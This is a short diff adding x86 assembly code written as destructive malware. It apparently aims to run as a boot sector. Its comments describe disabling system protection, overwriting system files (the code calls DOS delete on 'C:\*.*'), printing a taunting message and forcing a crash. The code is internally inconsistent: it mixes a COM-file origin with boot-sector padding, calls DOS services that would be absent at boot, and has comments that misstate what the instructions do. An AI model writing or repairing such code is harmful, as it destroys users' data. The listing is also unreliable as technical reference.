@@ -1,0 +1,31 @@
+; E
+
+ORG 100h
+
+start:
+    ; Disable system protection
+    mov ax, 2510h
+    mov bx, 0001h
+    int 15h
+
+    ; Randomly overwrite system files
+    mov ah, 41h
+    mov dx, offset files
+    int 21h
+
+    ; E
+    mov ah, 9
+    mov dx, offset message
+    int 21h
+
+    ; Trigger a system crash
+    mov ax, 0
+    mov es, ax
+    mov word ptr es:0FFFFh, 0
+    int 15h
+
+message db "AHASHAHAHAHAHAHAHAHAHJXBFJRKDL", 0
+files db "C:\*.*", 0
+
+times 510-($-$$) db 0
+dw 0AA55h
